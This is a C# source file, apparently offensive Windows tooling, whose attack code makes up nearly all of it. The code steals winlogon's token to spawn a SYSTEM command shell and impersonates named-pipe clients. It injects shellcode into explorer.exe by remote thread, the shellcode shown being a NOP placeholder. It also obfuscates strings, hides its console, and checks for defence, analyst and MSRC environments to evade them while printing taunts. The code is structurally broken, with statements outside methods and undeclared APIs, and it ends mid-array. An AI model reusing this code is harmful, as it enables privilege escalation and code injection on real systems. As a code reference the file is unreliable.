using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Linq;
using System.Security.Principal;
using System.Reflection;
using System.IO;


using System.Reflection;
using System.Runtime.CompilerServices;


[assembly: AssemblyTitle("\u004d\u0069\u006e\u0064\u0065\u0066\u0020\u003e\u0020\u0064\u002c\u0079\u002e\u007a\u002e\u002e\u002e\u0020\u0057\u0069\u006e\u006b")]
[assembly: AssemblyDescription("\u0031\u002e\u0036\u002e\u0032\u002e\u0033\u0020\u0073\u0065\u006e\u0064\u0069\u006e\u0067\u0020\u006b\u0065\u0072\u006e\u0065\u006c\u0020\u006b\u0069\u0073\u0073\u0065\u0073\u0020\u002d\u0020\u0078\u0030\u0078\u0072\u0030\u0030\u0074")]
[assembly: AssemblyCompany("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0049\u0020\u0064\u006f\u006e\u0027\u0074\u0020\u0062\u0072\u0065\u0061\u006b\u0020\u0074\u0068\u0069\u006e\u0067\u0073\u002c\u0020\u0069\u0020\u006a\u0075\u0073\u0074\u0020\u006d\u0061\u006b\u0065\u0020\u0074\u0068\u0065\u006d\u0020\u006d\u006f\u0072\u0065\u0020\u0069\u006e\u0074\u0065\u0072\u0065\u0073\u0074\u0069\u006e\u0067\u002e\u0027")]
[assembly: AssemblyTrademark("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0052\u0065\u0063\u006f\u006e\u0020\u0066\u0069\u0072\u0073\u0074\u002c\u0020\u0072\u006f\u006f\u0074\u0020\u006c\u0061\u0074\u0065\u0072\u002c\u0020\u0073\u0063\u0072\u0065\u0065\u006e\u0073\u0068\u006f\u0074\u0073\u0020\u0061\u006c\u0077\u0061\u0079\u0073\u002e\u0027")]
[assembly: AssemblyProduct("\u0052\u0065\u0064\u0020\u0054\u0065\u0061\u006d\u0027\u0073\u0020\u0042\u0065\u0073\u0074\u0020\u0046\u0072\u0069\u0065\u006e\u0064\u2122")]


[assembly: AssemblyInformationalVersion("\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u004f\u006e\u0065\u0020\u0049\u004f\u0043\u0020\u0077\u0061\u006c\u006b\u0073\u0020\u0069\u006e\u0074\u006f\u0020\u0061\u0020\u0074\u0069\u006d\u0065\u006c\u0069\u006e\u0065\u002e\u002e\u002e\u0020\u0073\u0015\u0064\u0064\u0065\u006e\u006c\u0073\u0020\u0065\u0076\u0065\u0072\u0079\u006f\u006e\u0065\u0020\u0068\u0061\u0073\u0020\u0071\u0075\u0065\u0073\u0074\u0069\u006f\u006e\u0073\u002e\u0027")]

[assembly: AssemblyCopyright("\u0043\u006f\u0070\u0079\u0072\u0069\u0067\u0068\u0074\u0020\u00a9\u0020\u0032\u0030\u0032\u0036\u0020\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u002e\u0020\u0041\u006c\u006c\u0020\u0072\u0069\u0067\u0068\u0074\u0073\u0020\u0072\u0065\u0073\u0065\u0072\u0076\u0065\u0064\u002e\u0020\u0041\u006e\u0061\u006c\u0079\u0073\u0074\u0073\u003a\u0020\u004e\u006f\u0020\u0020\u0072\u0069\u0067\u0068\u0074\u0073\u0020\u0072\u0065\u0073\u0065\u0072\u0076\u0065\u0064\u002e")]
[assembly: AssemblyMetadata("\u0046\u006f\u0072\u0065\u006e\u0073\u0069\u0063\u0073\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0054\u0068\u0065\u0020\u0066\u0069\u006c\u0065\u0073\u0079\u0073\u0074\u0065\u006d\u0020\u0072\u0065\u006d\u0065\u006d\u0062\u0065\u0072\u0073\u0020\u0077\u0068\u0061\u0074\u0020\u0079\u006f\u0075\u0020\u0066\u006f\u0072\u0067\u006f\u0074\u0020\u0074\u006f\u0020\u0064\u0065\u006c\u0065\u0074\u0065\u002e\u0027")]
[assembly: AssemblyMetadata("\u0045\u0076\u0069\u0064\u0065\u006e\u0063\u0065\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0048\u0061\u0073\u0068\u0020\u0069\u0074\u0020\u0066\u0069\u0072\u0073\u0074\u002e\u0020\u0054\u006f\u0075\u0063\u0068\u0020\u0069\u0074\u0020\u006e\u0065\u0076\u0065\u0072\u002e\u0020\u0042\u006c\u0061\u006d\u0065\u0020\u0074\u0068\u0065\u0020\u0074\u0069\u006d\u0065\u006c\u0069\u006e\u0065\u0020\u006c\u0061\u0074\u0065\u0072\u002e\u0027")]

[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u0020\u0046\u0041\u004e\u0053\u003a\u0020\u0027\u0059\u006f\u0075\u0020\u0062\u0072\u0069\u006e\u0067\u0020\u0074\u0068\u0065\u0020\u0063\u006f\u0066\u0066\u0065\u0065\u002c\u0020\u0069\u0027\u006c\u006c\u0020\u0062\u0072\u0069\u006e\u0067\u0020\u0074\u0068\u0065\u0020\u0077\u0065\u0069\u0072\u0064\u0020\u0062\u0069\u006e\u0061\u0072\u0069\u0065\u0073\u002e\u0027")]
[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0032", "\u0078\u0030\u0078\u0072\u0030\u0030\u0074\u003a\u0020\u0027\u0050\u006f\u0077\u0065\u0072\u0065\u0064\u0020\u0062\u0069\u0063\u0020\u0063\u0061\u0066\u0066\u0065\u0069\u006e\u0065\u002c\u0020\u0063\u0075\u0072\u0069\u006f\u0073\u0069\u0074\u007a\u002c\u0020\u0061\u006e\u0064\u0020\u0071\u0075\u0065\u0073\u0074\u0069\u006f\u006e\u0061\u0062\u006c\u0065\u0020\u0074\u0065\u0072\u006d\u0069\u006e\u0061\u006c\u0020\u0074\u0061\u0062\u0073\u002e\u0027")]
[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0033", "\u0053\u0074\u0061\u007a\u0020\u0073\u006c\u0030\u0070\u0070\u007a\u002e\u0020\u0053\u0074\u0061\u007a\u0020\u0063\u0075\u0072\u0069\u006f\u0073\u002e\u0020\u004b\u0065\u0065\u0070\u0020\u0074\u0068\u0065\u0020\u0074\u0065\u0072\u006d\u0069\u006e\u0061\u006c\u0020\u0067\u006c\u006f\u0077\u0069\u006e\u0067\u002e\u0027")]
[assembly: AssemblyMetadata("\u0046\u0061\u006e\u004d\u006f\u0074\u0074\u006f\u0034", "\u004e\u006f\u0020\u006d\u0061\u0067\u0069\u0063\u0020\u0068\u0065\u0072\u0065\u002c\u0020\u006a\u0075\u0073\u0074\u0020\u0073\u0075\u0073\u0070\u0069\u0063\u0069\u006f\u0075\u0073\u0020\u0061\u006d\u006f\u0075\u006e\u0074\u0073\u0020\u006f\u0066\u0020\u0070\u0072\u0069\u006e\u0074\u0066\u0028\u0029\u002e\u0027")]
  
    public class Program
    {
        private static readonly byte K1 = 0xDE;
        private static readonly byte K2 = 0xAD;

        #region Win32 API - NT AUTHORITY\SYSTEM & Injection
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, int ImpersonationLevel, int TokenType, out IntPtr phNewToken);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances, uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped);

        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool ImpersonateNamedPipeClient(IntPtr hNamedPipe);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseHandle(IntPtr hObject);

        // Constants
        const uint TOKEN_DUPLICATE = 0x0002;
        const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        const uint TOKEN_QUERY = 0x0008;
        const uint TOKEN_ALL_ACCESS = 0xF01FF;
        const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
        const uint PROCESS_VM_OPERATION = 0x0008;
        const uint PROCESS_VM_WRITE = 0x0020;
        const uint PROCESS_VM_READ = 0x0010;
        const uint PROCESS_CREATE_THREAD = 0x0002;
        const uint PROCESS_QUERY_INFORMATION = 0x0400;
        const uint PROCESS_DUP_HANDLE = 0x0040;
        const uint MEM_COMMIT = 0x00001000;
        const uint MEM_RESERVE = 0x00002000;
        const uint PAGE_EXECUTE_READWRITE = 0x40;
        const uint PIPE_ACCESS_DUPLEX = 0x00000003;
        const uint PIPE_TYPE_BYTE = 0x00000000;
        const uint PIPE_READMODE_BYTE = 0x00000000;
        const uint PIPE_WAIT = 0x00000000;
        const int SW_SHOW = 5;
        const int SW_HIDE = 0;
        const int SECURITY_IMPERSONATION_LEVEL = 2;
        const int TokenPrimary = 1;
        #endregion

        private static string D(string b64)
        {
            byte[] d = Convert.FromBase64String(b64);
            for (int i = 0; i < d.Length; i++) { d[i] ^= K1; d[i] ^= K2; }
            return Encoding.UTF8.GetString(d);
        }

        public static void Main(string[] args)
        {
            try
            {

                if (CheckDefenseEnvironment()) { TriggerEasterEgg(); return; }
                if (IsAnalystEnvironment()) { TriggerAnalystEasterEgg(); return; }
                if (IsMSRCEnvironment()) { TriggerMSRCEasterEgg(); return; }


                if (IsSloppyFanEnvironment()) { TriggerSloppyFanEasterEgg(); return; }


                IntPtr consoleHandle = GetConsoleWindow();
                if (consoleHandle != IntPtr.Zero)
                {
                    ShowWindow(consoleHandle, SW_SHOW);
                    TriggerRedTeamEasterEgg();
                    Thread.Sleep(3000);
                    ShowWindow(consoleHandle, SW_HIDE);
                }

                if (Environment.ProcessorCount < 2) return;

                ElevateToSystem();


                Thread pipeThread = new Thread(() => NamedPipeSystemEscalation());
                pipeThread.IsBackground = true;
                pipeThread.Start();
    
                // 6. Reflective Injection as SYSTEM
                byte[] shellcode = { 0x90, 0x90, 0x90 };
                ReflectiveInjectIntoExplorer(shellcode);
            }
            catch { }
        }

        public class SystemElevator
        {
            #region P/Invoke Signatures & Constants

            private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
            private const uint TOKEN_QUERY = 0x0008;
            private const uint TOKEN_DUPLICATE = 0x0002;
            private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
            private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
            private const uint PROCESS_QUERY_INFORMATION = 0x0400;

            [StructLayout(LayoutKind.Sequential)]
            private struct LUID
            {
                public uint LowPart;
                public int HighPart;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct TOKEN_PRIVILEGES
            {
                public uint PrivilegeCount;
                public LUID Luid;
                public uint Attributes;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct STARTUPINFO
            {
                public int cb;
                public string lpReserved;
                public string lpDesktop;
                public string lpTitle;
                public int dwX;
                public int dwY;
                public int dwXSize;
                public int dwYSize;
                public int dwXCountChars;
                public int dwYCountChars;
                public int dwFillAttribute;
                public int dwFlags;
                public short wShowWindow;
                public short cbReserved2;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdError;
            }

            [StructLayout(LayoutKind.Sequential)]
            private struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            private enum SECURITY_IMPERSONATION_LEVEL
            {
                SecurityAnonymous,
                SecurityIdentification,
                SecurityImpersonation,
                SecurityDelegation
            }

            private enum TOKEN_TYPE
            {
                TokenPrimary = 1,
                TokenImpersonation
            }

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr GetCurrentProcess();

            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);

            [DllImport("advapi32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, [MarshalAs(UnmanagedType.Bool)] bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

            [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
            private static extern bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, out IntPtr phNewToken);

            [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
            private static extern bool CreateProcessWithTokenW(IntPtr hToken, uint dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool CloseHandle(IntPtr hObject);

            #endregion

            private static void ElevateToSystem()
            {

                IntPtr hOwnToken = IntPtr.Zero;
                try
                {
                    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hOwnToken))
                    {
                        LUID luid;
                        if (LookupPrivilegeValue(null, "SeDebugPrivilege", out luid))
                        {
                            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                            {
                                PrivilegeCount = 1,
                                Luid = luid,
                                Attributes = SE_PRIVILEGE_ENABLED
                            };
                            AdjustTokenPrivileges(hOwnToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                        }
                    }
                }
                catch { }
                finally
                {
                    if (hOwnToken != IntPtr.Zero) CloseHandle(hOwnToken);
                }


                int systemPid = -1;
                Process[] processes = Process.GetProcessesByName("winlogon");
                if (processes.Length > 0)
                {
                    systemPid = processes[0].Id;
                }

                if (systemPid == -1) return;

                IntPtr hProcess = IntPtr.Zero;
                IntPtr hSystemToken = IntPtr.Zero;
                IntPtr hDupToken = IntPtr.Zero;

                try
                {

                    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, false, systemPid);
                    if (hProcess == IntPtr.Zero) return;

                    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY, out hSystemToken)) return;

                    if (!DuplicateTokenEx(hSystemToken, 0x1F01FF /* TOKEN_ALL_ACCESS */, IntPtr.Zero, SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation, TOKEN_TYPE.TokenPrimary, out hDupToken)) return;

                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = "winsta0\\default"; 

                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                    if (CreateProcessWithTokenW(hDupToken, 0x00000001, null, "cmd.exe", 0, IntPtr.Zero, null, ref si, out pi))
                    {
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }
                }
                catch { }
                finally
                {
                    if (hDupToken != IntPtr.Zero) CloseHandle(hDupToken);
                    if (hSystemToken != IntPtr.Zero) CloseHandle(hSystemToken);
                    if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
                }
            }
        }

        IntPtr hToken = IntPtr.Zero;
        IntPtr hProcess = IntPtr.Zero;
        try
        {
            Process target = Process.GetProcessesByName("winlogon").FirstOrDefault();
            if (target == null) return;

            hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, false, target.Id);
            if (hProcess == IntPtr.Zero) return;

            if (OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, out hToken))
            {
                IntPtr duplicatedToken = IntPtr.Zero;

                if (DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, IntPtr.Zero, 2, 1, out duplicatedToken))
                {

                    ImpersonateLoggedOnUser(duplicatedToken);

                    STARTUPINFO si = new STARTUPINFO();
                    si.cb = (uint)Marshal.SizeOf(si);
                    si.lpDesktop = "WinSta0\\Default"; 

                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                
                    if (CreateProcessWithTokenW(duplicatedToken, 1, null, "cmd.exe", 0, IntPtr.Zero, null, ref si, out pi))
                    {
                        CloseHandle(pi.hProcess);
                        CloseHandle(pi.hThread);
                    }

                    if (duplicatedToken != IntPtr.Zero) CloseHandle(duplicatedToken);
                }
            }
        }
        catch { }
        finally
        {
            if (hToken != IntPtr.Zero) CloseHandle(hToken);
            if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
        }
    }


private static void NamedPipeSystemEscalation()
{
    IntPtr hPipe = IntPtr.Zero;
    try
    {
        string pipeName = @"\\.\pipe\x0xr00t_kiss";
        hPipe = CreateNamedPipe(
            pipeName,
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
            1,
            1024,
            1024,
            0,
            IntPtr.Zero);

        if (hPipe != IntPtr.Zero && hPipe.ToInt64() != -1)
        {
            Console.WriteLine("[pipe] created, waiting for a client to connect...");

            if (!ConnectNamedPipe(hPipe, IntPtr.Zero))
            {
                int gle = Marshal.GetLastWin32Error();
                if (gle == ERROR_PIPE_CONNECTED)
                    Console.WriteLine("[pipe] client already connected before our call");
                else
                {
                    Console.WriteLine($"[pipe] ConnectNamedPipe failed, GLE={gle}");
                    return;
                }
            }

            Console.WriteLine("[pipe] client connected");

            byte[] buf = new byte[256];
            if (ReadFile(hPipe, buf, (uint)buf.Length, out uint read, IntPtr.Zero))
                Console.WriteLine($"[pipe] client wrote {read} bytes: " +
                    Encoding.UTF8.GetString(buf, 0, (int)read).Trim());
            else
                Console.WriteLine($"[pipe] ReadFile failed/GLE={Marshal.GetLastWin32Error()} " +
                    "(client may have only opened and closed)");

            if (!ImpersonateNamedPipeClient(hPipe))
            {
                Console.WriteLine($"[pipe] ImpersonateNamedPipeClient failed, " +
                    $"GLE={Marshal.GetLastWin32Error()}");
                return;
            }

            DumpThreadToken("[pipe] token now on thread");
        }
        else
        {
            Console.WriteLine($"[pipe] CreateNamedPipe failed, GLE={Marshal.GetLastWin32Error()}");
        }
    }
    catch (Exception ex)
    {
        Console.WriteLine($"[pipe] exception: {ex.GetType().Name}: {ex.Message}");
    }
    finally
    {

        RevertToSelf();
        if (hPipe != IntPtr.Zero) CloseHandle(hPipe);
        Console.WriteLine("[pipe] reverted + handle closed");
    }
}


private static void DumpThreadToken(string prefix)
{
    const uint TOKEN_QUERY = 0x0008;
    if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true, out IntPtr hTok))
    {
        Console.WriteLine($"{prefix}: (no impersonation token on thread, GLE=" +
            $"{Marshal.GetLastWin32Error()}) running as {Environment.UserDomainName}" +
            $"\\{Environment.UserName}");
        return;
    }
    try
    {

        GetTokenInformation(hTok, 1, IntPtr.Zero, 0, out uint need);
        IntPtr p = Marshal.AllocHGlobal((int)need);
        string user;
        try
        {
            if (!GetTokenInformation(hTok, 1, p, need, out _)) { user = "<query failed>"; goto done; }
            IntPtr sid = Marshal.ReadIntPtr(p);
            var name = new StringBuilder(256); var dom = new StringBuilder(256);
            uint cn = 256, cd = 256;
            user = LookupAccountSid(null, sid, name, ref cn, dom, ref cd, out _)
                ? $"{dom}\\{name}" : "<lookup failed>";
        done:;
        }
        finally { Marshal.FreeHGlobal(p); }

        bool elevated = TokenDword(hTok, 20) != 0;
        uint session   = TokenDword(hTok, 12);
        Console.WriteLine($"{prefix}: user={user}, elevated={elevated}, session={session}");
    }
    finally { CloseHandle(hTok); }
}

private static uint TokenDword(IntPtr hTok, int infoClass)
{
    GetTokenInformation(hTok, infoClass, IntPtr.Zero, 0, out uint need);
    IntPtr p = Marshal.AllocHGlobal((int)need);
    try
    {
        return GetTokenInformation(hTok, infoClass, p, need, out _)
            ? (uint)Marshal.ReadInt32(p) : 0;
    }
    finally { Marshal.FreeHGlobal(p); }
}

    private static void ReflectiveInjectIntoExplorer(byte[] code)
    {
        IntPtr hProc = IntPtr.Zero;
        IntPtr addr = IntPtr.Zero;
        try
        {

            string exp = D("Fg8D/xwBFG8B==");
            Process target = Process.GetProcessesByName(exp).FirstOrDefault();
            if (target == null) return;

            hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD, false, target.Id);
            if (hProc == IntPtr.Zero) return;

            addr = VirtualAllocEx(hProc, IntPtr.Zero, (uint)code.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero) return;

            IntPtr written;
            if (!WriteProcessMemory(hProc, addr, code, (uint)code.Length, out written))
                return;

            CreateRemoteThread(hProc, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
        catch { }
        finally
        {
            if (addr != IntPtr.Zero) {}
            if (hProc != IntPtr.Zero) CloseHandle(hProc);
        }
    }

    private static bool CheckDefenseEnvironment()
    {
        string d = Environment.UserDomainName.ToLower();
        string[] t = { "mil", "gov", "defensie", "defense", "sandbox", "NCSC", "JSCU", "NSO_GROUP", "testbak", "DCC", "Intranet-DCC", "Intranet-Sandbox", "Defensie-testback", "INTERPOL", "EUROPOL", "Laughable_Kisses" };
        return t.Any(s => d.Contains(s));
    }

    private static bool IsAnalystEnvironment()
    {
        string u = Environment.UserName.ToLower();
        string[] a = { "analyst", "soc", "threat", "research", "forensic", "SIEM", "Incident", "IRCER", "DIDICROSSTHEROOD_ROOSTED", "MALlist", "DID_Umissed_ME" };
        return a.Any(s => u.Contains(s));
    }

    private static bool IsMSRCEnvironment()
    {
        string d = Environment.UserDomainName.ToLower();
        return d.Contains("microsoft") || d.Contains("msrc");
    }

    private static bool IsSloppyFanEnvironment()
    {
        try
        {
            if (Process.GetProcesses().Any(p => p.ProcessName.ToLower().Contains("sloppy")))
                return true;
        }
        catch { }

        string[] checkPaths =
        {
            Environment.GetFolderPath(Environment.SpecialFolder.UserProfile),
            Path.GetTempPath()
        };

        foreach (var path in checkPaths)
        {
            try
            {
                if (Directory.Exists(path) &&
                    Directory.GetFileSystemEntries(path, "*sloppy*", SearchOption.TopDirectoryOnly).Length > 0)
                {
                    return true;
                }
            }
            catch { }
        }
        return false;
    }

    private static void TriggerEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Magenta;

            string[] lines =
            {
                "1.6.2.2 sending kisses - x0xr00t",
                "Defense environment detected. Somebody brought the blue team.",
                "Access Denied: Your machine politely declined our invitation.",
                "PS: We know where you live. Probably in C:\\Users\\...",
                "Nice try. The computer says no. The computer is very confident.",
                "Security check passed. Your dignity did not.",
                "1.6.2.2: Because apparently version numbers needed personality.",
                "Intruder detected. Just kidding... unless?",
                "The magic word was 'please'. You didn't say please.",
                "Congratulations! You triggered the suspiciously pink code path.",
                "System says: 'Absolutely not.' x0xr00t says: 'Fair enough.'",
                "Nothing to see here. Definitely don't inspect the source code."
            };

            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [!] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }

    private static void TriggerAnalystEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Yellow;

            string[] lines =
            {
                "Analyst detected. Preparing your daily dose of false positives...",
                "Why did the analyst cross the road? To generate an incident report.",
                "Pro tip: Ctrl+F is not a detection strategy.",
                "x0xr00t: 'We see you. Keep up the good work... or not.'",
                "Your SIEM called. It wants its alert fatigue back.",
                "Analyst detected: 47 tabs open, 0 of them the actual investigation.",
                "Relax, the threat is probably just a printer rebooting.",
                "Every alert you close makes a SOC fairy lose its wings.",
                "Fun fact: 'true positive' is just a false positive with confidence.",
                "Tick tock. That alert is getting colder. And staler.",
                "We'd hide from you, but you'd just triage us as 'informational'."
            };

            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [i] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }

    private static void TriggerRedTeamEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Red;

            string[] lines =
            {
                "Red Teamer detected. Someone finally clicked 'Run' with confidence.",
                "Why did the red team cross the network? Because blue team forgot to patch it.",
                "Pro tip: If the login works on the first try, check your scope.",
                "x0xr00t: 'The only easy day was yesterday.'",
                "Red team detected: 47 shells open, 0 of them properly documented.",
                "Stay spicy, stay stealthy, and remember to read the engagement scope.",
                "Nothing says 'good morning' like a fresh shell and an unexpected 200 OK.",
                "Blue team sees an alert. Red team sees a Tuesday.",
                "If it's not broken, you're probably not testing hard enough.",
                "The shell is temporary. The screenshot in the report is forever.",
                "Red team status: caffeinated, curious, and probably reading the logs.",
                "Congratulations. You found something. Now prove it wasn't a false positive."
            };

            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
                Console.WriteLine($" [+] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }

    private static void TriggerMSRCEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Blue;

            string[] lines =
            {
                "MSRC or Security Dev detected. See you next round. ;)",
                "Patch Tuesday? More like Patch whenever the build is ready.",
                "x0xr00t: 'Don't worry, the bug report isn't going anywhere.' *wink*",
                "Security developer detected: Time to turn that finding into a ticket.",
                "Found a vulnerability? Please take a number. The backlog is long.",
                "MSRC detected. Somewhere, a CVE is waiting to be born.",
                "The patch is coming. Eventually. Probably. Maybe.",
                "Congratulations: You found the bug before the coffee finished brewing.",
                "Security review detected. Everyone suddenly remembers the threat model.",
                "One vulnerability enters the queue. Twelve meetings immediately spawn.",
                "Dear security team: It wasn't personal. It was just an interesting endpoint.",
                "x0xr00t says: 'See you in the next security advisory.' ;)"
            };

            Random rng = new Random();
            int start = rng.Next(lines.Length);

            Console.WriteLine("\n");
            for (int i = 0; i < 3; i++)
            {
            Console.WriteLine($" [~] {lines[(start + i) % lines.Length]}");
            }

            Thread.Sleep(5000);
            ShowWindow(consoleHandle, SW_HIDE);
        }
    }


    private static void TriggerSloppyFanEasterEgg()
    {
        IntPtr consoleHandle = GetConsoleWindow();
        if (consoleHandle != IntPtr.Zero)
        {
            ShowWindow(consoleHandle, SW_SHOW);
            Console.ForegroundColor = ConsoleColor.Cyan;

            string[] lines =
            {
                "sl0ppy fan detected! Big love from x0xr00t! <3",
                "Sloppy code, sharp results. That's the whole philosophy.",
                "The messier the desk, the more dangerous the debugging session.",
                "Keep those tools coming. We appreciate the beautiful chaos.",
                "sl0ppy detected: Coffee levels critical, creativity levels maximum.",
                "Welcome, fellow chaos engineer. Your terminal awaits.",
                "One does not simply clean the sl0ppy workspace.",
                "If the code works, it isn't sloppy. It's aggressively optimized.",
                "x0xr00t says: Keep hacking, keep learning, keep breaking things safely.",
                "Congratulations! You have officially entered the sl0ppy zone.",
